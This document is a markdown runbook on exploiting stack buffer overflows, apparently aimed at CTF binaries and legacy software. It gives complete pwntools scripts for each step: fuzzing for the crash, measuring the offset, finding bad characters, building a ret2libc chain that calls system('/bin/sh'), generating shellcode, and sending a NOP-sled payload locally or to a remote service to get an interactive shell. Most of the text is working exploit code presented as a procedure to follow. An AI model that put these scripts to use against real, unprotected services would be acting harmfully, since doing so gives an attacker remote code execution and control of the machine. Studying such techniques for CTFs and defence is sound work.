# Stack overflow exploitation

The classic workflow: find the crash, measure the offset, identify constraints, find a
return address, deliver the payload. This applies to CTF binaries, legacy software, and
anything compiled without modern protections.

## Check protections

Before starting, know what you are dealing with:

```text
checksec --file=./target
# look for: NX, PIE, canary, RELRO, ASLR
```

This runbook assumes NX disabled (shellcode injection possible) or handles the NX
case with a ret2libc approach. For full NX+ASLR, see the ROP chain runbook.

## Find the crash

Fuzz the input until the program crashes with a segfault:

```python
from pwn import *

target = './target'

for size in range(100, 2000, 100):
    payload = b'A' * size
    p = process(target)
    p.sendline(payload)
    output = p.recvall(timeout=1)
    ret = p.poll()
    if ret is not None and ret < 0:
        print(f'Crash at size: {size}')
        p.close()
        break
    p.close()
```

## Find the exact offset

Use a cyclic pattern to find the exact number of bytes before EIP/RIP:

```python
from pwn import *

# generate a cyclic pattern
pattern = cyclic(500)

p = process('./target')
p.sendline(pattern)
p.wait()

# read the core dump
core = Coredump('./core')
# for x86
offset = cyclic_find(core.eip)
# for x64
offset = cyclic_find(core.read(core.rsp, 4))
print(f'Offset: {offset}')
```

Alternatively with gdb:

```text
gdb -q ./target
(gdb) run $(python3 -c "import pwn; print(pwn.cyclic(500).decode())")
(gdb) x/wx $eip        # x86
(gdb) x/gx $rsp        # x64: return address is at RSP after crash
(gdb) python3 -c "import pwn; print(pwn.cyclic_find(0x6161616b))"
```

## Identify bad characters

Some bytes corrupt the input (null bytes terminate strings, newlines flush buffers,
carriage returns truncate, etc.). Send all 256 byte values and check which are missing
or modified in memory:

```python
from pwn import *

bad_chars = []
all_bytes = bytes(range(1, 256))  # skip null for now

p = process('./target')
# send pattern up to offset, then all bytes
p.sendline(b'A' * offset + all_bytes)
p.wait()

core = Coredump('./core')
# examine memory at the controlled region
mem = core.read(core.esp - len(all_bytes), len(all_bytes))
for i, (sent, received) in enumerate(zip(all_bytes, mem)):
    if sent != received:
        print(f'Bad char: {hex(sent)} at position {i}')
```

Add null byte `\x00` to the bad chars list by default unless the input is binary-safe.

## Find a return address

### Shellcode on the stack (NX disabled)

If NX is disabled, place shellcode on the stack and point EIP to it. Find a reliable
stack address:

```text
gdb -q ./target
(gdb) run $(python3 -c "print('A' * OFFSET + 'B' * 4)")
(gdb) x/200x $esp-200   # look for your A pattern, pick an address in the middle
```

A NOP sled improves reliability: pad before the shellcode so any address within the
sled lands correctly.

### ret2libc (NX enabled, no ASLR or known libc base)

Return into `system("/bin/sh")` using libc addresses:

```python
from pwn import *

elf = ELF('./target')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')  # adjust path

# find system and /bin/sh in libc
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))
exit_addr = libc.symbols['exit']

# x86 calling convention: return address, then args on stack
payload = b'A' * offset
payload += p32(system_addr)
payload += p32(exit_addr)   # return from system
payload += p32(binsh_addr)
```

## Generate shellcode

```python
from pwn import *

context.arch = 'i386'  # or 'amd64'
context.os = 'linux'

shellcode = asm(shellcraft.sh())
print(f'Shellcode length: {len(shellcode)} bytes')
print(f'Shellcode (hex): {shellcode.hex()}')
```

Verify no bad characters appear in the shellcode. If they do, use a different
shellcraft variant or encode the shellcode.

## Build and deliver the exploit

```python
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

elf = ELF('./target')
p = process('./target')
# or: p = remote('target.example.com', 9999)

OFFSET = 412  # from step 2
RET_ADDR = 0xffffcf20  # from step 4, address in NOP sled

nop_sled = b'\x90' * 100
shellcode = asm(shellcraft.sh())

payload  = b'A' * OFFSET
payload += p32(RET_ADDR)
payload += nop_sled
payload += shellcode

p.sendline(payload)
p.interactive()
```

## Remote targets

For network services, the workflow is the same but delivered over a socket:

```python
p = remote('target.example.com', 9999)

# if the service sends a banner first
p.recvuntil(b'Enter input: ')
p.sendline(payload)
p.interactive()
```

Adjust `recvuntil` to match the service's prompt. Use `recvline()` to consume output
between interactions.
